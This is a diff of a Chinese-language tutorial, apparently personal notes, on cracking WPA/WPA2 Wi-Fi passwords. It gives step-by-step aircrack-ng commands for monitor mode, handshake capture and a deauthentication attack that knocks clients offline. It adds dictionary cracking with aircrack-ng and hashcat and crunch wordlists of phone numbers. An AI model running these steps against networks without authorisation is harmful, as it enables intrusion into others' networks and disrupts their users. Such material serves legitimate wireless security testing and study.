@@ -3,7 +3,7 @@
 
 参考：
 
-- [【Aircrack】Kali linux 下使用 Aircrack-ng 对于 wifi 暴力破解的使用教程](https://freeerror.org/d/161-kali-linux-aircrack-ng-wifi)
+- [Kali使用Aircrack-ng进行暴力破解WIFI密码_aircrck-ng 跑密码-CSDN博客](https://blog.csdn.net/RFZ_322/article/details/123344248)
 - [【Aircrack】Kali Linux使用Aircrack破解wifi密码(wpa_wpa2) - 罗道义 - 博客园](https://www.cnblogs.com/daoyi/p/Kali-Linux-shi-yongAircrack-po-jiewifi-mi-ma-wpawp.html)
 - [【Aircrack】Kali破解wifi最基础版_运维_河南理工杨轻帆的博客-CSDN博客](https://blog.csdn.net/tangjikede2008/article/details/99758890)
 - [【Aircrack】airodump-ng帮助手册翻译 - lim42 - 博客园](https://www.cnblogs.com/lim42/p/6887905.html)
@@ -20,35 +20,54 @@
 
 ## airmon-ng, airodump-ng, aireplay-ng, aircrack-ng 工具的使用
 
-```sh
+```shell
 # 查看支持的网卡
-airmon-ng
+airmon-ng 
 
 # 将网卡切换成监听模式
 # wlan0 是网卡名称，开启后会在后面加上mon
 airmon-ng start wlan0
+```
 
+```shell
 # 扫描无线列表
 airodump-ng wlan0mon
 
-# 查看指定 BSSID 的详情
+# 查看指定 BSSID 的详情(非必要步骤)
 airodump-ng -d 08:1F:71:xx:xx:xx wlan0mon
+```
 
+```shell
 # 抓握手包，在这里面包含加密的密码
 airodump-ng -c 1 --bssid 08:1F:71:xx:xx:xx -w ~/wifi/ wlan0mon
+```
 
+```shell
 # 攻击连接上该热点的客户端，让其掉线重连，以获取握手包
+# 注意：执行主动攻击的时候新建一个终端执行命令，原来的抓包终端不要结束
 aireplay-ng -0 20 -a 08:1F:71:xx:xx:xx -c 04:33:85:xx:xx:xx wlan0mon
+```
+参数解释：
+- `-0` 表示发起deauthentication攻击
+- `-a` 指定无线路由器BSSID
+- `-c` 指定强制断开的设备
 
+```shell
 # 停止监听模式
 airmon-ng stop wlan0mon
 
 # 跑字典获取密码
-aircrack-ng -a2 -b 08:1F:71:xx:xx:xx -w ~/baoli/rockyou.txt ~/wifi/*.cap 
+aircrack-ng -a2 -b 08:1F:71:xx:xx:xx -w /usr/share/wordlists/rockyou.txt ~/wifi/*.cap 
 ```
+参数解释：
+
+- `-a2` 代表WPA的握手包
+- `-b` 指定要破解的wifi BSSID。
+- `-w` 指定字典文件
+- 最后是抓取的包
 
 ## 使用 Hashcat 快速跑字典
-
+  
 Hashcat for windows: [hashcat-5.1.0.7z](https://hashcat.net/files/hashcat-5.1.0.7z) [hashcat-utils](https://github.com/hashcat/hashcat-utils/releases)
 
 ```
@@ -59,7 +78,9 @@ cap2hccapx.exe 01.cap 01.hccapx
 hashcat64.exe -m 2500 D:\test\01.hccapx D:\zd\word.txt  --session=whypie0
 ```
 
-## 使用 Chrunch 生成任意字典
+## 使用 Crunch 生成任意字典
+
+- https://github.com/shadwork/Windows-Crunch/releases
 
 生成手机号，新建一个 `num.txt` 文件，内容为：
 
@@ -72,3 +93,5 @@ numeric = [345789]
 ```
 crunch 11 11 -f ./num.txt numeric -t 1@%%%%%%%%% -o allPhones.txt
 ```
+
+- 生成8位随机数字：`crunch 8 8 0123456789 -o digits_8.txt`
